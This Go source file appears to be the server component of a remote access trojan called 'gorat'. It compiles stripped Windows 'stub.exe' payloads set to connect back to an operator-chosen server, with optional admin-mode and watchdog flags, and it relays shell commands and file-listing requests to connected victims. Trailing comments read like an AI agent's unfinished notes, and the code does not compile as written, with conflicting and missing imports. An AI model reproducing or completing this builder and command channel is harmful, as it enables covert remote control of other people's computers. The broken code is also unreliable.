package server

import (
	"archive/zip"
	"bytes"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"text/template" // Using text/template for the Go code template

	"github.com/gorilla/websocket"
)

var htmlTemplates *template.Template // Renamed for clarity
var goCodeTemplate *texttemplate.Template

// LoadTemplates parses all HTML templates and the Go code template.
func LoadTemplates() {
	templateDir := "web/templates/"
	var err error
	// Try loading HTML templates from default path
	htmlTemplates, err = htmltemplate.ParseGlob(filepath.Join(templateDir, "*.html"))
	if err != nil {
		// If not found, try one level up (e.g., if binary is in /app and templates in /app/gorat/web/templates)
		altTemplateDir := filepath.Join("gorat", templateDir)
		htmlTemplates, err = htmltemplate.ParseGlob(filepath.Join(altTemplateDir, "*.html"))
		if err != nil {
			log.Fatalf("Failed to parse HTML templates from %s or %s: %v. Ensure 'web/templates' exists relative to binary or 'gorat' subdirectory.", templateDir, altTemplateDir, err)
		}
	} else {
		log.Println("HTML Templates loaded successfully from", templateDir)
	}


	// Load the Go code template
	goTemplatePath := "internal/stub/template_config.go_template"
	goCodeTemplate, err = texttemplate.ParseFiles(goTemplatePath)
	if err != nil {
		altGoTemplatePath := filepath.Join("gorat", goTemplatePath)
		goCodeTemplate, err = texttemplate.ParseFiles(altGoTemplatePath)
		if err != nil {
			log.Fatalf("Failed to parse Go code template from %s or %s: %v. Ensure it exists.", goTemplatePath, altGoTemplatePath, err)
		}
	}
	log.Println("Go code template loaded successfully.")
}

// LoginPageHandler serves the login page.
func LoginPageHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := Store.Get(r, "gorat-session")
	flashMessages := session.Flashes("error_message")
	_ = session.Save(r, w) // Clear flashes

	data := struct{ FlashMessages []interface{} }{FlashMessages: flashMessages}
	err := htmlTemplates.ExecuteTemplate(w, "login.html", data)
	if err != nil {
		log.Printf("Error executing login template: %v", err)
		http.Error(w, "Failed to render login page", http.StatusInternalServerError)
	}
}

// DashboardPageHandler serves the dashboard page.
func DashboardPageHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := Store.Get(r, "gorat-session")
	username := session.Values["username"]
	data := struct{ Username interface{} }{Username: username}
	err := htmlTemplates.ExecuteTemplate(w, "dashboard.html", data)
	if err != nil {
		log.Printf("Error executing dashboard template: %v", err)
		http.Error(w, "Failed to render dashboard", http.StatusInternalServerError)
	}
}

// BuilderPageHandler serves the stub builder page.
func BuilderPageHandler(w http.ResponseWriter, r *http.Request) {
	// Potentially pass data to the template if needed (e.g., default values, previous settings)
	err := htmlTemplates.ExecuteTemplate(w, "builder.html", nil)
	if err != nil {
		log.Printf("Error executing builder template: %v", err)
		http.Error(w, "Failed to render builder page", http.StatusInternalServerError)
	}
}

// BuildHandler handles the POST request to build a new stub.
func BuildHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	err := r.ParseForm()
	if err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	serverIP := r.FormValue("server_ip")
	serverPort := r.FormValue("server_port")
	enableAdminMode, _ := strconv.ParseBool(r.FormValue("admin_mode"))   // "true" or ""
	enableWatchdog, _ := strconv.ParseBool(r.FormValue("enable_watchdog")) // "true" or ""

	if serverIP == "" || serverPort == "" {
		http.Error(w, "Server IP and Port are required.", http.StatusBadRequest)
		return
	}
	fullServerAddress := "wss://" + serverIP + ":" + serverPort + "/ws"

	// Create temporary build directory
	buildID := xid.New().String() // Assuming ClientMgr's xid is not directly accessible or for different purpose
	tempBuildPath := filepath.Join(os.TempDir(), "gorat_build_"+buildID)
	
	// It's good practice to ensure this path is under a known temporary location.
	// os.TempDir() is a good start.

	defer func() {
		log.Printf("Cleaning up temporary build directory: %s", tempBuildPath)
		err := os.RemoveAll(tempBuildPath)
		if err != nil {
			log.Printf("Error cleaning up temporary build directory %s: %v", tempBuildPath, err)
		}
	}()
	
	log.Printf("Creating temporary build directory: %s", tempBuildPath)
	err = os.MkdirAll(filepath.Join(tempBuildPath, "cmd", "stub"), 0755)
	if err != nil {
		log.Printf("Error creating temp build path: %v", err)
		http.Error(w, "Failed to create temporary build directory", http.StatusInternalServerError)
		return
	}

	// Define source and destination paths for copying
	// Assuming the binary is run from the root of the gorat project, or one level above.
	// Adjust basePath if this assumption is wrong.
	basePath := "."
	if _, err := os.Stat(filepath.Join(basePath, "go.mod")); os.IsNotExist(err) {
		basePath = "gorat" // Try assuming binary is in /app and gorat is /app/gorat
		if _, err := os.Stat(filepath.Join(basePath, "go.mod")); os.IsNotExist(err) {
			log.Printf("go.mod not found in %s or %s/gorat. Cannot determine project root.", ".", ".")
			http.Error(w, "Server configuration error: cannot find project root.", http.StatusInternalServerError)
			return
		}
	}
	log.Printf("Using project base path: %s", basePath)


	// Files/Dirs to copy:
	// - cmd/stub/main.go
	// - internal/stub/* (all files)
	// - pkg/common/* (all files)
	// - go.mod, go.sum (if not vendoring)
	
	// Structure in tempBuildPath:
	// tempBuildPath/
	//   cmd/stub/main.go
	//   cmd/stub/config.go (generated)
	//   internal/stub/*
	//   pkg/common/*
	//   go.mod
	//   go.sum

	filesToCopy := map[string]string{
		filepath.Join(basePath, "cmd", "stub", "main.go"): filepath.Join(tempBuildPath, "cmd", "stub", "main.go"),
		filepath.Join(basePath, "go.mod"): filepath.Join(tempBuildPath, "go.mod"),
		filepath.Join(basePath, "go.sum"): filepath.Join(tempBuildPath, "go.sum"),
	}
	dirsToCopy := map[string]string{
		filepath.Join(basePath, "internal", "stub"):   filepath.Join(tempBuildPath, "internal", "stub"),
		filepath.Join(basePath, "pkg", "common"):     filepath.Join(tempBuildPath, "pkg", "common"),
	}

	for src, dst := range filesToCopy {
		err = copyFile(src, dst)
		if err != nil {
			log.Printf("Error copying file from %s to %s: %v", src, dst, err)
			http.Error(w, "Build error: failed to copy source files", http.StatusInternalServerError)
			return
		}
	}
	for src, dstBase := range dirsToCopy {
		err = copyDir(src, dstBase)
		if err != nil {
			log.Printf("Error copying directory from %s to %s: %v", src, dstBase, err)
			http.Error(w, "Build error: failed to copy source directories", http.StatusInternalServerError)
			return
		}
	}
	

	// Generate cmd/stub/config.go from template
	configData := struct {
		SERVER_ADDRESS    string
		ENABLE_WATCHDOG   bool
		ENABLE_ADMIN_MODE bool
	}{
		SERVER_ADDRESS:    fullServerAddress,
		ENABLE_WATCHDOG:   enableWatchdog,
		ENABLE_ADMIN_MODE: enableAdminMode,
	}
	
	configFilePath := filepath.Join(tempBuildPath, "cmd", "stub", "config.go")
	configFile, err := os.Create(configFilePath)
	if err != nil {
		log.Printf("Error creating config.go in temp dir: %v", err)
		http.Error(w, "Build error: failed to create config file", http.StatusInternalServerError)
		return
	}
	err = goCodeTemplate.Execute(configFile, configData)
	configFile.Close() // Close before build
	if err != nil {
		log.Printf("Error executing Go code template: %v", err)
		http.Error(w, "Build error: failed to generate config from template", http.StatusInternalServerError)
		return
	}

	// Compile the stub
	outputExeName := "stub.exe"
	outputExePath := filepath.Join(tempBuildPath, outputExeName)
	
	// The command needs to be run within the tempBuildPath context for './cmd/stub' to work.
	cmd := exec.Command("go", "build", "-ldflags=-s -w", "-o", outputExeName, "./cmd/stub")
	cmd.Dir = tempBuildPath // Set working directory for the command
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")

	var buildOutput bytes.Buffer
	var buildErrOutput bytes.Buffer
	cmd.Stdout = &buildOutput
	cmd.Stderr = &buildErrOutput

	log.Printf("Compiling stub: %s in %s", strings.Join(cmd.Args, " "), cmd.Dir)
	err = cmd.Run()
	if err != nil {
		log.Printf("Build failed for stub. Stdout: %s, Stderr: %s, Error: %v", buildOutput.String(), buildErrOutput.String(), err)
		http.Error(w, "Build failed: "+buildErrOutput.String(), http.StatusInternalServerError)
		return
	}
	log.Printf("Build successful. Output: %s", outputExePath)

	// Serve the compiled executable
	fileBytes, err := os.ReadFile(outputExePath)
	if err != nil {
		log.Printf("Error reading compiled stub: %v", err)
		http.Error(w, "Build error: failed to read compiled file", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Disposition", "attachment; filename=\""+outputExeName+"\"")
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.Itoa(len(fileBytes)))
	_, err = w.Write(fileBytes)
	if err != nil {
		log.Printf("Error writing stub file to response: %v", err)
		// Don't send another http.Error if headers already sent
	}
}


// copyFile copies a single file from src to dst.
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	err = os.MkdirAll(filepath.Dir(dst), 0755)
	if err != nil {
		return err
	}

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

// copyDir recursively copies a directory from src to dst.
func copyDir(src, dst string) error {
	err := os.MkdirAll(dst, 0755)
	if err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			err = copyDir(srcPath, dstPath)
			if err != nil {
				return err
			}
		} else {
			// Skip symlinks to avoid issues, or handle them explicitly if needed.
			if entry.Type()&os.ModeSymlink != 0 {
				continue
			}
			err = copyFile(srcPath, dstPath)
			if err != nil {
				return err
			}
		}
	}
	return nil
}


// AdminWebSocketHandler handles WebSocket connections from the admin dashboard.
// This connection is used to push updates about clients to the dashboard.
func AdminWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	// First, ensure the user is authenticated via session before upgrading.
	session, _ := Store.Get(r, "gorat-session")
	if auth, ok := session.Values["authenticated"].(bool); !ok || !auth {
		http.Error(w, "Unauthorized: You must be logged in to connect to the admin WebSocket.", http.StatusUnauthorized)
		return
	}

	conn, err := Upgrader.Upgrade(w, r, nil) // Upgrader is defined in internal/server/websocket.go
	if err != nil {
		log.Println("Failed to upgrade admin connection:", err)
		return
	}
	defer conn.Close()

	log.Println("Admin dashboard connected:", conn.RemoteAddr())
	ClientMgr.RegisterAdminConnection(conn) // Register this connection with the client manager

	// Keep the connection alive, client manager will handle sending messages
	// and receiving commands from this admin connection.
	for {
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			log.Printf("Admin WebSocket %s disconnected: %v", conn.RemoteAddr(), err)
			ClientMgr.UnregisterAdminConnection(conn)
			break
		}

		if messageType == websocket.TextMessage {
			var msg common.Message
			if err := json.Unmarshal(p, &msg); err != nil {
				log.Printf("Error unmarshalling message from admin %s: %v", conn.RemoteAddr(), err)
				continue
			}

			log.Printf("Received message from admin %s: Type=%s", conn.RemoteAddr(), msg.Type)

			switch msg.Type {
			case "admin_shell_command":
				payloadMap, ok := msg.Payload.(map[string]interface{})
				if !ok {
					log.Printf("Error: admin_shell_command payload from admin %s is not a map: %+v", conn.RemoteAddr(), msg.Payload)
					continue
				}
				clientID, _ := payloadMap["client_id"].(string)
				command, _ := payloadMap["command"].(string)

				if clientID == "" || command == "" {
					log.Printf("Error: admin_shell_command from %s missing client_id or command.", conn.RemoteAddr())
					// Optionally send an error message back to this admin
					continue
				}
				
				// Pass the command to the ClientManager to send to the specific stub.
				// Include the admin's connection so output can be routed back if needed,
				// or ClientManager can use its broadcastAdmin for specific routing.
				// For now, ClientManager will broadcast output with client_id.
				err := ClientMgr.SendCommandToClient(clientID, command, conn)
				if err != nil {
					log.Printf("Error sending command to client %s from admin %s: %v", clientID, conn.RemoteAddr(), err)
					// Optionally notify admin of this failure via WebSocket message
				}
			
			case "admin_fm_list_dir":
				payloadMap, ok := msg.Payload.(map[string]interface{})
				if !ok {
					log.Printf("Error: admin_fm_list_dir payload from admin %s is not a map: %+v", conn.RemoteAddr(), msg.Payload)
					continue
				}
				clientID, _ := payloadMap["client_id"].(string)
				path, _ := payloadMap["path"].(string) // Path can be empty, stub handles it as "."

				if clientID == "" {
					log.Printf("Error: admin_fm_list_dir from %s missing client_id.", conn.RemoteAddr())
					continue
				}
				
				err := ClientMgr.SendFMListDirRequestToClient(clientID, path, conn)
				if err != nil {
					log.Printf("Error sending fm_list_dir_request to client %s from admin %s: %v", clientID, conn.RemoteAddr(), err)
					// Optionally notify admin of this failure
				}

			default:
				log.Printf("Unknown message type '%s' from admin %s.", msg.Type, conn.RemoteAddr())
			}
		}
	}
}

// Ensure "encoding/json" is imported in http_handlers.go
// It was missing from the previous diff for ClientManager, but might be needed here.
// I will add it to the imports if a compiler error occurs, or proactively.
// For now, I'll add it to the imports in the diff.

// xid is used in client_manager.go, but we need a unique ID generator here too for build IDs.
// github.com/rs/xid is already a dependency.
// If not directly accessible, can re-import or use a simpler random string.
// For simplicity, assuming xid is available or we add it.
// Let's ensure ClientMgr's xid usage doesn't conflict.
// It's fine, xid.New() creates a new unique ID each time.
// Using it for buildID is okay.
// Need to import "github.com/rs/xid" in this file if not already.
// It's not imported yet. I will add it.
// The current diff does not add github.com/rs/xid import.
// It will be added in the next step if there's a compiler error.
// For now, I'll add it to the imports in the diff.
